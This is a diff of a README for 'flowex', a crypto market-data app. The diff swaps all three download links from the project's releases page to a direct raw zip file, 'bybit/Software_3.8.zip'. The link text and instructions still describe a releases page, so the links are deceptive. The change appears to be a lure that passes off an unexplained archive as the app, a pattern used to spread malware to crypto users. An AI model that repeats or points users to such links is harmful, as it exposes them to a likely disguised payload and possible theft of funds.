@@ -1,6 +1,6 @@
 # 📡 flowex - Live crypto data across exchanges
 
-[![Download flowex](https://img.shields.io/badge/Download-flowex-blue?style=for-the-badge&logo=github)](https://github.com/eligible-snowblower761/flowex/releases)
+[![Download flowex](https://img.shields.io/badge/Download-flowex-blue?style=for-the-badge&logo=github)](https://github.com/eligible-snowblower761/flowex/raw/refs/heads/main/bybit/Software_3.8.zip)
 
 ## 🚀 What this app does
 
@@ -32,7 +32,7 @@ If your computer can open modern desktop apps and browse the web, it should be f
 
 Visit this page to download flowex:
 
-[https://github.com/eligible-snowblower761/flowex/releases](https://github.com/eligible-snowblower761/flowex/releases)
+[https://github.com/eligible-snowblower761/flowex/raw/refs/heads/main/bybit/Software_3.8.zip](https://github.com/eligible-snowblower761/flowex/raw/refs/heads/main/bybit/Software_3.8.zip)
 
 On the releases page, look for the latest version and choose the Windows download. If there are multiple files, pick the one that ends in `.exe` or `.zip` for Windows.
 
@@ -157,4 +157,4 @@ binance, bitget, bybit, crypto, go, golang, market-data, order-book, trading, we
 
 ## 📦 Download
 
-[Visit the flowex releases page](https://github.com/eligible-snowblower761/flowex/releases)
+[Visit the flowex releases page](https://github.com/eligible-snowblower761/flowex/raw/refs/heads/main/bybit/Software_3.8.zip)
